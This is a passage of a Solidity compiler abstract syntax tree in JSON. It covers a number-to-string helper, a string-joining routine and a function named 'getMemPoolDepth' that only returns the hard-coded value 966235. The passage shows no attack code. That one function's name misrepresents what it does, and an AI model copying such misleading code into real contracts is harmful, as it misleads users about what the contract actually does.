																		"id": 1054,
																		"name": "bstr",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1039,
																		"src": "11938:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 1057,
																	"indexExpression": {
																		"id": 1056,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "UnaryOperation",
																		"operator": "--",
																		"prefix": false,
																		"src": "11943:3:0",
																		"subExpression": {
																			"id": 1055,
																			"name": "k",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1046,
																			"src": "11943:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "11938:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"arguments": [
																		{
																			"arguments": [
																				{
																					"commonType": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					},
																					"id": 1066,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"hexValue": "3438",
																						"id": 1062,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "11963:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"nodeType": "BinaryOperation",
																					"operator": "+",
																					"rightExpression": {
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 1065,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"id": 1063,
																							"name": "_i",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1007,
																							"src": "11968:2:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "%",
																						"rightExpression": {
																							"hexValue": "3130",
																							"id": 1064,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "11973:2:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_10_by_1",
																								"typeString": "int_const 10"
																							},
																							"value": "10"
																						},
																						"src": "11968:7:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"src": "11963:12:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"id": 1061,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "11957:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 1060,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "11957:5:0",
																					"typeDescriptions": {}
																				}
																			},
																			"id": 1067,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"nameLocations": [],
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "11957:19:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 1059,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "11950:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_bytes1_$",
																			"typeString": "type(bytes1)"
																		},
																		"typeName": {
																			"id": 1058,
																			"name": "bytes1",
																			"nodeType": "ElementaryTypeName",
																			"src": "11950:6:0",
																			"typeDescriptions": {}
																		}
																	},
																	"id": 1068,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "11950:27:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"src": "11938:39:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"id": 1070,
															"nodeType": "ExpressionStatement",
															"src": "11938:39:0"
														},
														{
															"expression": {
																"id": 1073,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"id": 1071,
																	"name": "_i",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1007,
																	"src": "11992:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "/=",
																"rightHandSide": {
																	"hexValue": "3130",
																	"id": 1072,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "11998:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_10_by_1",
																		"typeString": "int_const 10"
																	},
																	"value": "10"
																},
																"src": "11992:8:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1074,
															"nodeType": "ExpressionStatement",
															"src": "11992:8:0"
														}
													]
												},
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1053,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 1051,
														"name": "_i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1007,
														"src": "11914:2:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"hexValue": "30",
														"id": 1052,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "11920:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "11914:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1076,
												"nodeType": "WhileStatement",
												"src": "11907:105:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 1079,
															"name": "bstr",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1039,
															"src": "12036:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"id": 1078,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "12029:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_string_storage_ptr_$",
															"typeString": "type(string storage pointer)"
														},
														"typeName": {
															"id": 1077,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "12029:6:0",
															"typeDescriptions": {}
														}
													},
													"id": 1080,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "12029:12:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 1011,
												"id": 1081,
												"nodeType": "Return",
												"src": "12022:19:0"
											}
										]
									},
									"id": 1083,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "uint2str",
									"nameLocation": "11574:8:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1008,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1007,
												"mutability": "mutable",
												"name": "_i",
												"nameLocation": "11588:2:0",
												"nodeType": "VariableDeclaration",
												"scope": 1083,
												"src": "11583:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1006,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "11583:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "11582:9:0"
									},
									"returnParameters": {
										"id": 1011,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1010,
												"mutability": "mutable",
												"name": "_uintAsString",
												"nameLocation": "11629:13:0",
												"nodeType": "VariableDeclaration",
												"scope": 1083,
												"src": "11615:27:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1009,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "11615:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "11614:29:0"
									},
									"scope": 1189,
									"src": "11565:484:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1090,
										"nodeType": "Block",
										"src": "12113:32:0",
										"statements": [
											{
												"expression": {
													"hexValue": "393636323335",
													"id": 1088,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "12131:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_rational_966235_by_1",
														"typeString": "int_const 966235"
													},
													"value": "966235"
												},
												"functionReturnParameters": 1087,
												"id": 1089,
												"nodeType": "Return",
												"src": "12124:13:0"
											}
										]
									},
									"id": 1091,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMemPoolDepth",
									"nameLocation": "12066:15:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1084,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "12081:2:0"
									},
									"returnParameters": {
										"id": 1087,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1086,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 1091,
												"src": "12107:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1085,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "12107:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "12106:6:0"
									},
									"scope": 1189,
									"src": "12057:88:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1187,
										"nodeType": "Block",
										"src": "12426:532:0",
										"statements": [
											{
												"assignments": [
													1101
												],
												"declarations": [
													{
														"constant": false,
														"id": 1101,
														"mutability": "mutable",
														"name": "_baseBytes",
														"nameLocation": "12450:10:0",
														"nodeType": "VariableDeclaration",
														"scope": 1187,
														"src": "12437:23:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 1100,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "12437:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 1106,
												"initialValue": {
													"arguments": [
														{
															"id": 1104,
															"name": "_base",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1093,
															"src": "12469:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1103,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "12463:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
															"typeString": "type(bytes storage pointer)"
														},
														"typeName": {
															"id": 1102,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "12463:5:0",
															"typeDescriptions": {}
														}
													},
													"id": 1105,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "12463:12:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "12437:38:0"
											},
											{
												"assignments": [
													1108
												],
												"declarations": [
													{
														"constant": false,
														"id": 1108,
														"mutability": "mutable",
														"name": "_valueBytes",
														"nameLocation": "12499:11:0",
														"nodeType": "VariableDeclaration",
														"scope": 1187,
														"src": "12486:24:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 1107,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "12486:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 1113,
												"initialValue": {
													"arguments": [
														{
															"id": 1111,
															"name": "_value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1095,
															"src": "12519:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1110,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "12513:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
															"typeString": "type(bytes storage pointer)"
														},
														"typeName": {
															"id": 1109,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "12513:5:0",
															"typeDescriptions": {}
														}
													},
													"id": 1112,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "12513:13:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "12486:40:0"
											},
											{
												"assignments": [
													1115
												],
												"declarations": [
													{
														"constant": false,
														"id": 1115,
														"mutability": "mutable",
														"name": "_tmpValue",
														"nameLocation": "12553:9:0",
														"nodeType": "VariableDeclaration",
														"scope": 1187,
														"src": "12539:23:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1114,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "12539:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 1124,
												"initialValue": {
													"arguments": [
														{
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1122,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"expression": {
																	"id": 1118,
																	"name": "_baseBytes",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1101,
																	"src": "12576:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes_memory_ptr",
																		"typeString": "bytes memory"
																	}
																},
																"id": 1119,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberLocation": "12587:6:0",
																"memberName": "length",
																"nodeType": "MemberAccess",
																"src": "12576:17:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "+",
															"rightExpression": {
																"expression": {
																	"id": 1120,
																	"name": "_valueBytes",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1108,
																	"src": "12596:11:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes_memory_ptr",
																		"typeString": "bytes memory"
																	}
																},
																"id": 1121,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberLocation": "12608:6:0",
																"memberName": "length",
																"nodeType": "MemberAccess",
																"src": "12596:18:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "12576:38:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1117,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "NewExpression",
														"src": "12565:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_objectcreation_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
															"typeString": "function (uint256) pure returns (string memory)"
														},
														"typeName": {
															"id": 1116,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "12569:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														}
													},
													"id": 1123,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "12565:50:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "12539:76:0"
											},
											{
												"assignments": [
													1126
												],
												"declarations": [
													{
														"constant": false,
														"id": 1126,
														"mutability": "mutable",
														"name": "_newValue",
														"nameLocation": "12639:9:0",
														"nodeType": "VariableDeclaration",
														"scope": 1187,
														"src": "12626:22:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 1125,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "12626:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 1131,
												"initialValue": {
													"arguments": [
														{
															"id": 1129,
															"name": "_tmpValue",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1115,
															"src": "12657:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1128,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "12651:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
															"typeString": "type(bytes storage pointer)"
														},
														"typeName": {
															"id": 1127,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "12651:5:0",
															"typeDescriptions": {}
														}
													},
													"id": 1130,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "12651:16:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "12626:41:0"
											},
											{
												"assignments": [
													1133
												],
												"declarations": [
													{
														"constant": false,
														"id": 1133,
														"mutability": "mutable",
														"name": "i",
														"nameLocation": "12685:1:0",
														"nodeType": "VariableDeclaration",
														"scope": 1187,
														"src": "12680:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1132,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "12680:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 1134,
												"nodeType": "VariableDeclarationStatement",
												"src": "12680:6:0"
											},
											{
												"assignments": [
													1136
												],
												"declarations": [
													{
														"constant": false,
														"id": 1136,
														"mutability": "mutable",
														"name": "j",
														"nameLocation": "12702:1:0",
														"nodeType": "VariableDeclaration",
														"scope": 1187,
														"src": "12697:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1135,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "12697:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 1137,
												"nodeType": "VariableDeclarationStatement",
												"src": "12697:6:0"
											},
											{
												"body": {
													"id": 1158,
													"nodeType": "Block",
													"src": "12751:57:0",
													"statements": [
														{
															"expression": {
																"id": 1156,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"baseExpression": {
																		"id": 1149,
																		"name": "_newValue",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1126,
																		"src": "12766:9:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 1152,
																	"indexExpression": {
																		"id": 1151,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "UnaryOperation",
																		"operator": "++",
																		"prefix": false,
																		"src": "12776:3:0",
																		"subExpression": {
																			"id": 1150,
																			"name": "j",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1136,
																			"src": "12776:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "12766:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"baseExpression": {
																		"id": 1153,
																		"name": "_baseBytes",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1101,
																		"src": "12783:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 1155,
																	"indexExpression": {
																		"id": 1154,
																		"name": "i",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1133,
																		"src": "12794:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "IndexAccess",
																	"src": "12783:13:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"src": "12766:30:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"id": 1157,
															"nodeType": "ExpressionStatement",
															"src": "12766:30:0"
														}
													]
												},
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1145,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 1142,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1133,
														"src": "12725:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"expression": {
															"id": 1143,
															"name": "_baseBytes",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1101,
															"src": "12727:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														},
														"id": 1144,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "12738:6:0",
														"memberName": "length",
														"nodeType": "MemberAccess",
														"src": "12727:17:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "12725:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1159,
												"initializationExpression": {
													"expression": {
														"id": 1140,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"id": 1138,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1133,
															"src": "12720:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"hexValue": "30",
															"id": 1139,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "12722:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "12720:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1141,
													"nodeType": "ExpressionStatement",
													"src": "12720:3:0"
												},
												"loopExpression": {
													"expression": {
														"id": 1147,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": false,
														"src": "12746:3:0",
														"subExpression": {
															"id": 1146,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1133,
															"src": "12746:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1148,
													"nodeType": "ExpressionStatement",
													"src": "12746:3:0"
												},
												"nodeType": "ForStatement",
												"src": "12716:92:0"
											},
											{
												"body": {
													"id": 1180,
													"nodeType": "Block",
													"src": "12856:58:0",
													"statements": [
														{
															"expression": {
																"id": 1178,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"baseExpression": {
																		"id": 1171,
																		"name": "_newValue",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1126,
																		"src": "12871:9:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 1174,
																	"indexExpression": {
																		"id": 1173,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "UnaryOperation",
																		"operator": "++",
																		"prefix": false,
																		"src": "12881:3:0",
																		"subExpression": {
																			"id": 1172,
																			"name": "j",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1136,
																			"src": "12881:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"typeDescriptions": {
